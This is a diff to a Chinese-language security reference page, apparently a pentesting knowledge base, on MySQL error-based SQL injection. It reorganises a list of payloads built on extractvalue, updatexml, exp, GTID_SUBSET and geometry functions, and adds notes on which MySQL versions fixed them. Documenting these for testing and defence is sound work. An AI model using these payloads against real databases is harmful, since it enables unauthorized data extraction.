@@ -43,14 +43,21 @@ Fuzz注入点
 - ``extractvalue(1, concat(0x5c,(select user())))``
 - ``updatexml(0x3a,concat(1,(select user())),1)``
 - ``exp(~(SELECT * from(select user())a))``
+- ``ST_LatFromGeoHash((select * from(select * from(select user())a)b))``
+- ``GTID_SUBSET(version(), 1)``
+
+基于geometric的报错注入
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 - ``GeometryCollection((select * from (select * from(select user())a)b))``
 - ``polygon((select * from(select * from(select user())a)b))``
 - ``multipoint((select * from(select * from(select user())a)b))``
 - ``multilinestring((select * from(select * from(select user())a)b))``
 - ``LINESTRING((select * from(select * from(select user())a)b))``
 - ``multipolygon((select * from(select * from(select user())a)b))``
-- ``ST_LatFromGeoHash((select * from(select * from(select user())a)b))``
-- ``GTID_SUBSET(version(), 1)``
+
+其中需要注意的是，基于exp函数的报错注入在MySQL 5.5.49后的版本已经不再生效，具体可以参考这个 `commit 95825f <https://github.com/mysql/mysql-server/commit/95825fa28a7e84a2f5dbdef5241078f7055c5b04>`_ 。
+
+而以上列表中基于geometric的报错注入在这个 `commit 5caea4 <https://github.com/mysql/mysql-server/commit/5caea4a995130cd7c82574acc591ff7c46d9d978>`_ 中被修复，在5.5.x较后的版本中同样不再生效。
 
 堆叠注入
 --------------------------------------
